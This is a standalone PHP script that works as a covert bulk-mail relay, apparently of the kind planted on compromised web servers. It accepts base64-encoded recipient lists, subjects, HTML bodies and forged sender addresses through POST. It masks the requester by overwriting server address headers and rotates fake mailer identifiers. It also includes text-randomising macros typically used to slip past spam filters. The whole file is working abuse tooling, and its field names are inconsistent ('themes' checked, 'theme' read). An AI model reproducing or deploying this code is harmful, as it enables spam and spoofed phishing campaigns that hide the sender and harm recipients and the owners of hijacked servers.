
if(!isset($_POST["emails"])
        OR !isset($_POST["themes"])
        OR !isset($_POST["message"])
        OR !isset($_POST["froms"])
)
{
    exit();
}

if(get_magic_quotes_gpc())
{
    foreach($_POST as $key => $post)
    {
        $_POST[$key] = stripcslashes($post);
    }
}

$emails = base64_decode($_POST["emails"]);
$theme = base64_decode($_POST["theme"]);
$message = base64_decode($_POST["message"]);
$from = base64_decode($_POST["from"]);
$mailers = base64_decode($_POST["mailers"]);

if(isset($_SERVER))
{
    $_SERVER['PHP_SELF'] = "/"; 
    $_SERVER['REMOTE_ADDR'] = $_SERVER['SERVER_ADDR'];
    if(!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $_SERVER['HTTP_X_FORWARDED_FOR'] = "127.0.0.1";
    }

}

if(empty($emails))
{
    exit('empty');
}

$mailers = explode("\n", $mailers);
$mailer = $mailers[array_rand($mailers)];

$emails = explode("|", $emails);

for($i = 0; $i < count($emails); $i++)
{ 
	$email = $emails[$i];
	send_mail($from, $email, $theme, $message, $mailer);
}

function send_mail($from, $to, $subj, $text, $mailer)
{
    $un = strtoupper(uniqid(time()));
    $zag = "";
    $head = "From: $from\n";
    $head .= "X-Mailer: $mailer\n";
    $head .= "Reply-To: $from\n";

    $head .= "Mime-Version: 1.0\n";
    $head .= "Content-Type:multipart/mixed;";
    $head .= "boundary=\"----------".$un."\"\n\n";

    $zag = "------------".$un."\nContent-Type:text/html;\n";
    $zag .= "Content-Transfer-Encoding: 8bit\n\n$text\n\n";

    if(@mail($to, $subj, $zag, $head))
    {
        if(!empty($_POST['verbose']))
            echo "SENDED";
    }
    else
    {
        if(!empty($_POST['verbose']))
            echo "FAIL";
    }
}

function alter_macros($content)
{
    preg_match_all('#{(.*)}#Ui', $content, $matches);

    for($i = 0; $i < count($matches[1]); $i++)
    {

        $ns = explode("|", $matches[1][$i]);
        $c2 = count($ns);
        $rand = rand(0, ($c2 - 1));
        $content = str_replace("{".$matches[1][$i]."}", $ns[$rand], $content);
    }
    return $content;
}

function text_macros($content)
{
    preg_match_all('#\[TEXT\-([[:digit:]]+)\-([[:digit:]]+)\]#', $content, $matches);

    for($i = 0; $i < count($matches[0]); $i++)
    {
        $min = $matches[1][$i];
        $max = $matches[2][$i];
        $rand = rand($min, $max);
        $word = generate_word($rand);

        $content = preg_replace("/".preg_quote($matches[0][$i])."/", $word, $content, 1);
    }

    preg_match_all('#\[TEXT\-([[:digit:]]+)\]#', $content, $matches);

    for($i = 0; $i < count($matches[0]); $i++)
    {
        $count = $matches[1][$i];

        $word  = generate_word($count);

        $content = preg_replace("/".preg_quote($matches[0][$i])."/", $word, $content, 1);
    }


    return $content;
}

function xnum_macros($content)
{
    preg_match_all('#\[NUM\-([[:digit:]]+)\]#', $content, $matches);

    for($i = 0; $i < count($matches[0]); $i++)
    {
        $num = $matches[1][$i];
        $min = pow(10, $num - 1);
        $max = pow(10, $num) - 1;

        $rand = rand($min, $max);
        $content = str_replace($matches[0][$i], $rand, $content);
    }
    return $content;
}

function num_macros($content)
{
    preg_match_all('#\[RAND\-([[:digit:]]+)\-([[:digit:]]+)\]#', $content, $matches);

    for($i = 0; $i < count($matches[0]); $i++)
    {
        $min = $matches[1][$i];
        $max = $matches[2][$i];
        $rand = rand($min, $max);
        $content = str_replace($matches[0][$i], $rand, $content);
    }
    return $content;
}

function generate_word($length)
{
    $chars = 'abcdefghijklmnopqrstuvyxz';
    $numChars = strlen($chars);
    $string = '';
    for($i = 0; $i < $length; $i++)
    {
        $string .= substr($chars, rand(1, $numChars) - 1, 1);
    }
    return $string;
}

